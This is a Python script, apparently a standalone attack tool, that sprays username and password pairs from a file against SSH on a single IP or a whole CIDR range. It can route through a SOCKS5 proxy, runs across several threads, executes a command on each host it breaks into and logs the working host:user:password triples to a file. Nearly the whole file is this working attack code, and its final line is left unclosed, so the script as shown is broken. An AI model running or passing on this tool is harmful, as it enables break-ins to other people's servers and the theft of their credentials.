import sys
import socket
import ipaddress
import paramiko
import threading
import socks
import subprocess

if sys.version_info >= (3, 0):
    unicode = str

def get_hosts_in_cidr(cidr):
    try:
        network = ipaddress.ip_network(unicode(cidr))
    except ValueError:
        return []
    else:
        return [str(host) for host in network.hosts()]

def get_hosts_in_ip(ip):
    return [str(ip)]

def test_ssh_login(hostname, username, password, socks_host=None, socks_port=None, debug=False):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if socks_host and socks_port:
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, socks_host, socks_port)
    else:
        sock = None
    try:
        client.connect(hostname, username=username, password=password, sock=sock, banner_timeout=30, auth_timeout=30, timeout=30)
    except Exception as e:
        if debug:
            print("Error connecting to {}: {}".format(hostname, str(e)))
        return False, ""
    ssh = client.invoke_shell()
    ssh.send("uname -a\n")
    output = ""
    while True:
        try:
            output += ssh.recv(1024).decode()
        except:
            break
    ssh.close()
    client.close()
    return True, output.strip()

def process_host(hosts, credentials, socks_host=None, socks_port=None, debug=False, output_file=None):
    for host in hosts:
        for credential in credentials:
            if isinstance(credential, bytes):
                credential = credential.decode('utf-8')
            username, password = credential.strip().split(':')
            success, output = test_ssh_login(host, username, password, socks_host, socks_port, debug)
            if success:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password)
                stdin, stdout, stderr = ssh.exec_command("uname -a")
                output_str = "{}:{}:{}\n".format(host, username, password)
                with open(output_file, "a") as f:
                    f.write(output_str)
                print(stdout.readlines())
                ssh.close()
                break

if len(sys.argv) < 3:
    print("Usage: " + sys.argv[0] + " [ip|cidr] [output_file] [--creds <credentials_file>] [--socks <socks_host> <socks_port>] [--debug]")
    sys.exit(1)

hostname = sys.argv[1]
output_file = sys.argv[2]

if '/' in hostname:
    hosts = get_hosts_in_cidr(hostname)
else:
    hosts = get_hosts_in_ip(hostname)

if '--creds' in sys.argv:
    idx = sys.argv.index('--creds')
    credentials_file = sys.argv[idx+1]
else:
    credentials_file = 'credentials.txt'

try:
    with open(credentials_file, "rb") as f:
        if sys.version_info >= (3, 0):
            credentials_list = f.read().decode('utf-8').splitlines()
        else:
            credentials_list = f.read().splitlines()
except IOError:
    print("Could not open credentials file")
    sys.exit(1)

if '--socks' in sys.argv:
    idx = sys.argv.index('--socks')
    socks_host = sys.argv[idx+1]
    socks_port = int(sys.argv[idx+2])
else:
    socks_host = None
    socks_port = None

if '--debug' in sys.argv:
    debug = True
else:
    debug = False

num_threads = min(len(hosts), 10)
threads = []

for i in range(num_threads):
    thread_hosts = hosts[i::num_threads]
    thread = threading.Thread(target=process_host, args=(thread_hosts, credentials_list, socks_host, socks_port, debug, output_file))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

sys.exit(0
